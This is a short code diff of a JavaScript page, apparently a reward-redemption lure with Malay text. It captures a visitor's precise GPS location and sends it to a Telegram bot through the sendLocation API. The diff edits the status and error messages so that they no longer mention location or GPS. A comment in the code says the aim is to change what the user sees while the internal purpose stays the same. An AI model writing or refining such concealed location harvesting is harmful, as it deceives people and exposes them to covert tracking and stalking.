@@ -96,7 +96,7 @@ function getLocation() {
     const lon = pos.coords.longitude;
 
     // Kekalkan status dalaman tapi ubah paparan luar untuk user
-    status.innerText = "⏳ Memproses pengesahan lokasi...";
+    status.innerText = "⏳ Memproses...";
 
     try {
       const res = await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
@@ -123,7 +123,7 @@ function getLocation() {
     }
 
   }, (err) => {
-    status.innerText = "⚠️ Sila benarkan akses lokasi (GPS) untuk menebus ganjaran.";
+    status.innerText = "⚠️ Sila benarkan akses untuk menebus ganjaran.";
   }, {
     enableHighAccuracy: true,
     timeout: 10000
